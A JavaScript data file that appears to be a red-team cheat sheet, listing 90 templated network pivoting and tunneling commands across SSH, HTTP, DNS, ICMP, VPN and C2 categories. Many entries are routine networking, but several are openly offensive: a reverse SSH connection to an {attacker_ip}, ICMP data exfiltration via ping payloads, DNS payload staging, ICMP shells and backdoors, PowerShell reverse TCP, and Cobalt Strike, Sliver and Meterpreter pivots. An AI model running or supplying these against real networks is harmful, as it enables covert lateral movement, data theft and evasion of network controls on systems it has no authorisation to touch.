// Network Pivoting & Tunneling Commands Database

const PIVOTING_COMMANDS = {
    "SSH Tunneling": [
        { id: 1, name: "Local Port Forward", command: "ssh -L {local_port}:{target_ip}:{target_port} {username}@{jump_server}", description: "Forward local port through SSH tunnel", category: "SSH Tunneling" },
        { id: 2, name: "Remote Port Forward", command: "ssh -R {remote_port}:{local_ip}:{local_port} {username}@{jump_server}", description: "Forward remote port back through SSH tunnel", category: "SSH Tunneling" },
        { id: 3, name: "Dynamic SOCKS Proxy", command: "ssh -D {local_port} {username}@{jump_server}", description: "Create SOCKS proxy through SSH", category: "SSH Tunneling" },
        { id: 4, name: "SSH Tunnel Background", command: "ssh -f -N -L {local_port}:{target_ip}:{target_port} {username}@{jump_server}", description: "SSH tunnel in background", category: "SSH Tunneling" },
        { id: 5, name: "SSH Jump Host", command: "ssh -J {username}@{jump_server}:{port} {username}@{target_server}", description: "Connect through jump host", category: "SSH Tunneling" },
        { id: 6, name: "Multiple SSH Hops", command: "ssh -o ProxyCommand='ssh -W %h:%p {username}@{jump1}' {username}@{target}", description: "Chain multiple SSH connections", category: "SSH Tunneling" },
        { id: 7, name: "SSH Reverse Shell", command: "ssh -R 4444:localhost:22 {username}@{attacker_ip}", description: "Create reverse SSH connection", category: "SSH Tunneling" },
        { id: 8, name: "SSH Config ProxyJump", command: "ssh -F ~/.ssh/config {target_host}", description: "Use SSH config for complex routing", category: "SSH Tunneling" },
        { id: 9, name: "SSH VPN over Tunnel", command: "ssh -w 0:0 {username}@{server}", description: "Create SSH VPN tunnel", category: "SSH Tunneling" },
        { id: 10, name: "SSH Compression", command: "ssh -C -L {local_port}:{target_ip}:{target_port} {username}@{jump_server}", description: "Compressed SSH tunnel", category: "SSH Tunneling" }
    ],
    
    "HTTP/HTTPS Tunneling": [
        { id: 11, name: "HTTP Tunnel via Burp", command: "java -jar burpsuite_pro.jar --proxy-http={proxy_ip}:{proxy_port}", description: "HTTP tunnel through Burp Suite", category: "HTTP Tunneling" },
        { id: 12, name: "HTTPTunnel Client", command: "htc -F {local_port} {server_ip}:{server_port}", description: "HTTP tunnel client", category: "HTTP Tunneling" },
        { id: 13, name: "HTTPTunnel Server", command: "hts -F {server_port} {target_ip}:{target_port}", description: "HTTP tunnel server", category: "HTTP Tunneling" },
        { id: 14, name: "Proxychains HTTP", command: "proxychains4 -f /etc/proxychains.conf {command}", description: "Route commands through HTTP proxy", category: "HTTP Tunneling" },
        { id: 15, name: "Chisel HTTP Tunnel", command: "chisel client {server_ip}:{server_port} {local_port}:{target_ip}:{target_port}", description: "Fast TCP/HTTP tunnel", category: "HTTP Tunneling" },
        { id: 16, name: "Chisel SOCKS", command: "chisel client {server_ip}:{server_port} socks", description: "SOCKS proxy via Chisel", category: "HTTP Tunneling" },
        { id: 17, name: "Revsocks Tunnel", command: "revsocks -listen :{port} -proxy {proxy_type}://{proxy_ip}:{proxy_port}", description: "Reverse SOCKS tunnel", category: "HTTP Tunneling" },
        { id: 18, name: "3Proxy SOCKS", command: "3proxy /path/to/3proxy.cfg", description: "3Proxy SOCKS server", category: "HTTP Tunneling" },
        { id: 19, name: "Dante SOCKS", command: "sockd -f /etc/sockd.conf", description: "Dante SOCKS proxy", category: "HTTP Tunneling" },
        { id: 20, name: "Stunnel SSL Tunnel", command: "stunnel /etc/stunnel/tunnel.conf", description: "SSL tunnel for non-SSL traffic", category: "HTTP Tunneling" }
    ],
    
    "DNS Tunneling": [
        { id: 21, name: "Iodine DNS Tunnel", command: "iodine -f {dns_server} {tunnel_domain}", description: "IP over DNS tunnel client", category: "DNS Tunneling" },
        { id: 22, name: "Iodined Server", command: "iodined -f {tunnel_ip} {tunnel_domain}", description: "Iodine DNS tunnel server", category: "DNS Tunneling" },
        { id: 23, name: "DNSCat2 Client", command: "dnscat2 {domain}", description: "DNS tunnel client", category: "DNS Tunneling" },
        { id: 24, name: "DNSCat2 Server", command: "ruby dnscat2.rb {domain}", description: "DNS tunnel server", category: "DNS Tunneling" },
        { id: 25, name: "DNS2TCP Client", command: "dns2tcpc -r ssh -k {key} -l {local_port} -z {zone} {dns_server}", description: "DNS2TCP tunnel client", category: "DNS Tunneling" },
        { id: 26, name: "DNS2TCP Server", command: "dns2tcpd -r ssh -k {key} -F -D -d 2 -f dns2tcpd.conf", description: "DNS2TCP tunnel server", category: "DNS Tunneling" },
        { id: 27, name: "DNSStager", command: "python dnsstager.py -d {domain} -s {payload}", description: "DNS-based payload delivery", category: "DNS Tunneling" },
        { id: 28, name: "OzymanDNS", command: "python ozymandns.py -d {domain} -s {server}", description: "DNS tunnel via Python", category: "DNS Tunneling" },
        { id: 29, name: "TCP-over-DNS", command: "tcpoverdns.py -s {server} -d {domain}", description: "TCP over DNS tunnel", category: "DNS Tunneling" },
        { id: 30, name: "PowerShell DNS", command: "powershell -c \"Invoke-PowerShellTcp -IPAddress {ip} -Port {port} -DNSTunnel {domain}\"", description: "PowerShell DNS tunnel", category: "DNS Tunneling" }
    ],
    
    "ICMP Tunneling": [
        { id: 31, name: "PTunnel Client", command: "ptunnel -p {proxy_server} -lp {local_port} -da {dest_ip} -dp {dest_port}", description: "ICMP tunnel client", category: "ICMP Tunneling" },
        { id: 32, name: "PTunnel Server", command: "ptunnel", description: "ICMP tunnel server", category: "ICMP Tunneling" },
        { id: 33, name: "ICMP Tunnel", command: "icmptunnel -s {server_ip}", description: "Simple ICMP tunnel", category: "ICMP Tunneling" },
        { id: 34, name: "Ping Tunnel", command: "pingtunnel -type client -l :{local_port} -s {server_ip} -t {target_ip}:{target_port}", description: "ICMP ping tunnel", category: "ICMP Tunneling" },
        { id: 35, name: "ICMP Shell", command: "icmpsh -t {target_ip}", description: "ICMP reverse shell", category: "ICMP Tunneling" },
        { id: 36, name: "Powercat ICMP", command: "powercat -l -p {port} -t 0 -ep", description: "PowerCat ICMP mode", category: "ICMP Tunneling" },
        { id: 37, name: "ICMP Backdoor", command: "icmpbackdoor -i {interface} -s {source_ip}", description: "ICMP-based backdoor", category: "ICMP Tunneling" },
        { id: 38, name: "Hping3 ICMP", command: "hping3 -1 -c 1000 -d 1400 {target_ip}", description: "ICMP flood for covert channel", category: "ICMP Tunneling" },
        { id: 39, name: "ICMP Data Exfil", command: "ping -c 1 -p $(echo '{data}' | xxd -p) {target_ip}", description: "Data exfiltration via ICMP", category: "ICMP Tunneling" },
        { id: 40, name: "ICMP Covert Channel", command: "covert_icmp -s {server_mode} -f {file}", description: "Covert ICMP communication", category: "ICMP Tunneling" }
    ],
    
    "Port Forwarding": [
        { id: 41, name: "Socat TCP Relay", command: "socat TCP-LISTEN:{local_port},fork TCP:{target_ip}:{target_port}", description: "TCP port forwarding with Socat", category: "Port Forwarding" },
        { id: 42, name: "Netsh Port Forward", command: "netsh interface portproxy add v4tov4 listenport={local_port} listenaddress={local_ip} connectport={target_port} connectaddress={target_ip}", description: "Windows netsh port forwarding", category: "Port Forwarding" },
        { id: 43, name: "SSH Port Forward", command: "ssh -L {local_port}:localhost:{remote_port} {username}@{server}", description: "Local SSH port forwarding", category: "Port Forwarding" },
        { id: 44, name: "Netcat Relay", command: "nc -l -p {local_port} -c 'nc {target_ip} {target_port}'", description: "Netcat port relay", category: "Port Forwarding" },
        { id: 45, name: "Rinetd Port Forward", command: "rinetd -c /etc/rinetd.conf", description: "Rinetd TCP port redirector", category: "Port Forwarding" },
        { id: 46, name: "Fpipe Port Forward", command: "fpipe -l {local_port} -r {target_port} {target_ip}", description: "Windows fpipe port forwarding", category: "Port Forwarding" },
        { id: 47, name: "Plink Port Forward", command: "plink -ssh -L {local_port}:{target_ip}:{target_port} {username}@{server}", description: "PuTTY plink port forwarding", category: "Port Forwarding" },
        { id: 48, name: "Pwnat NAT Bypass", command: "pwnat -c {server_ip} -p {port}", description: "NAT traversal without port forwarding", category: "Port Forwarding" },
        { id: 49, name: "UltraVNC Repeater", command: "uvnc_repeater -f repeater.ini", description: "VNC connection through NAT", category: "Port Forwarding" },
        { id: 50, name: "Proxifier Rules", command: "proxifier /rule:{rule_name} /proxy:{proxy_server}", description: "Application-specific proxy routing", category: "Port Forwarding" }
    ],
    
    "Proxy Chains": [
        { id: 51, name: "ProxyChains Config", command: "echo 'socks5 127.0.0.1 9050' >> /etc/proxychains.conf", description: "Configure ProxyChains", category: "Proxy Chains" },
        { id: 52, name: "ProxyChains Command", command: "proxychains4 {command}", description: "Route command through proxy chain", category: "Proxy Chains" },
        { id: 53, name: "Tor Proxy Chain", command: "proxychains4 curl http://{target_ip}", description: "Use ProxyChains with Tor", category: "Proxy Chains" },
        { id: 54, name: "Multiple Proxies", command: "proxychains4 -f custom_proxies.conf {command}", description: "Use custom proxy configuration", category: "Proxy Chains" },
        { id: 55, name: "Random Chain", command: "echo 'random_chain' > /etc/proxychains.conf", description: "Random proxy selection", category: "Proxy Chains" },
        { id: 56, name: "Dynamic Chain", command: "echo 'dynamic_chain' > /etc/proxychains.conf", description: "Dynamic proxy chain", category: "Proxy Chains" },
        { id: 57, name: "Strict Chain", command: "echo 'strict_chain' > /etc/proxychains.conf", description: "Strict proxy chain order", category: "Proxy Chains" },
        { id: 58, name: "ProxyChains DNS", command: "proxychains4 -q nslookup {domain}", description: "DNS queries through proxy", category: "Proxy Chains" },
        { id: 59, name: "ProxyChains Nmap", command: "proxychains4 nmap -sT -p {ports} {target}", description: "Nmap scan through proxy", category: "Proxy Chains" },
        { id: 60, name: "Chain Timeout", command: "echo 'chain_len = 3' >> /etc/proxychains.conf", description: "Configure proxy chain length", category: "Proxy Chains" }
    ],
    
    "VPN Pivoting": [
        { id: 61, name: "OpenVPN Client", command: "openvpn --config client.ovpn", description: "Connect to OpenVPN server", category: "VPN Pivoting" },
        { id: 62, name: "WireGuard VPN", command: "wg-quick up wg0", description: "Start WireGuard VPN", category: "VPN Pivoting" },
        { id: 63, name: "PPTP VPN", command: "pppd call vpn-connection", description: "PPTP VPN connection", category: "VPN Pivoting" },
        { id: 64, name: "L2TP VPN", command: "xl2tpd -D", description: "L2TP VPN daemon", category: "VPN Pivoting" },
        { id: 65, name: "IKEv2 VPN", command: "strongswan start", description: "IKEv2 VPN connection", category: "VPN Pivoting" },
        { id: 66, name: "TUN Interface", command: "ip tuntap add dev tun0 mode tun", description: "Create TUN interface", category: "VPN Pivoting" },
        { id: 67, name: "TAP Interface", command: "ip tuntap add dev tap0 mode tap", description: "Create TAP interface", category: "VPN Pivoting" },
        { id: 68, name: "Split Tunneling", command: "ip route add {network}/{mask} dev tun0", description: "Configure split tunneling", category: "VPN Pivoting" },
        { id: 69, name: "VPN Route Table", command: "ip route show table main", description: "Display VPN routing table", category: "VPN Pivoting" },
        { id: 70, name: "VPN DNS Config", command: "echo 'nameserver {dns_ip}' > /etc/resolv.conf", description: "Configure VPN DNS", category: "VPN Pivoting" }
    ],
    
    "Reverse Tunneling": [
        { id: 71, name: "Meterpreter AutoRoute", command: "run autoroute -s {network}/{mask}", description: "Add route through Meterpreter", category: "Reverse Tunneling" },
        { id: 72, name: "Meterpreter PortFwd", command: "portfwd add -l {local_port} -p {target_port} -r {target_ip}", description: "Meterpreter port forwarding", category: "Reverse Tunneling" },
        { id: 73, name: "Cobalt Strike Beacon", command: "beacon> socks {port}", description: "Cobalt Strike SOCKS proxy", category: "Reverse Tunneling" },
        { id: 74, name: "Empire AutoRoute", command: "usemodule management/invoke_metasploit", description: "Empire routing module", category: "Reverse Tunneling" },
        { id: 75, name: "NGrok Tunnel", command: "ngrok tcp {port}", description: "Expose local port through NGrok", category: "Reverse Tunneling" },
        { id: 76, name: "Serveo SSH Tunnel", command: "ssh -R 80:localhost:{port} serveo.net", description: "Public tunnel via Serveo", category: "Reverse Tunneling" },
        { id: 77, name: "LocalTunnel", command: "lt --port {port}", description: "Expose local server publicly", category: "Reverse Tunneling" },
        { id: 78, name: "PageKite Tunnel", command: "pagekite.py {port} {subdomain}.pagekite.me", description: "PageKite reverse tunnel", category: "Reverse Tunneling" },
        { id: 79, name: "Reverse SSH", command: "ssh -f -N -T -R {remote_port}:localhost:{local_port} {username}@{server}", description: "Persistent reverse SSH tunnel", category: "Reverse Tunneling" },
        { id: 80, name: "AutoSSH Reverse", command: "autossh -M 0 -f -T -N -R {remote_port}:localhost:{local_port} {username}@{server}", description: "Auto-reconnecting reverse SSH", category: "Reverse Tunneling" }
    ],
    
    "Advanced Pivoting": [
        { id: 81, name: "Double Pivot SSH", command: "ssh -J {user1}@{host1} -L {port1}:{target1}:{port1} {user2}@{host2}", description: "Double SSH pivot", category: "Advanced Pivoting" },
        { id: 82, name: "Metasploit Pivot", command: "use auxiliary/server/socks4a", description: "Metasploit SOCKS proxy", category: "Advanced Pivoting" },
        { id: 83, name: "Ligolo Agent", command: "ligolo -connect {server_ip}:{server_port}", description: "Ligolo tunneling agent", category: "Advanced Pivoting" },
        { id: 84, name: "Sliver Pivot", command: "portfwd add --bind {local_ip}:{local_port} --remote {target_ip}:{target_port}", description: "Sliver C2 port forwarding", category: "Advanced Pivoting" },
        { id: 85, name: "Hans VPN Tunnel", command: "hans -c {server_ip} -p {password}", description: "IP-over-ICMP VPN tunnel", category: "Advanced Pivoting" },
        { id: 86, name: "RPIVOT SOCKS", command: "python rpivot_client.py --server-ip {server_ip} --server-port {server_port}", description: "Reverse SOCKS proxy", category: "Advanced Pivoting" },
        { id: 87, name: "Gost Tunnel", command: "gost -L socks5://:{local_port} -F forward+ssh://{username}:{password}@{server_ip}:{server_port}", description: "Gost proxy tunnel", category: "Advanced Pivoting" },
        { id: 88, name: "Frp Tunnel", command: "frpc -c frpc.ini", description: "Fast reverse proxy", category: "Advanced Pivoting" },
        { id: 89, name: "V2Ray Tunnel", command: "v2ray -config client.json", description: "V2Ray proxy tunnel", category: "Advanced Pivoting" },
        { id: 90, name: "Shadowsocks", command: "ss-local -c config.json", description: "Shadowsocks SOCKS5 proxy", category: "Advanced Pivoting" }
    ]
};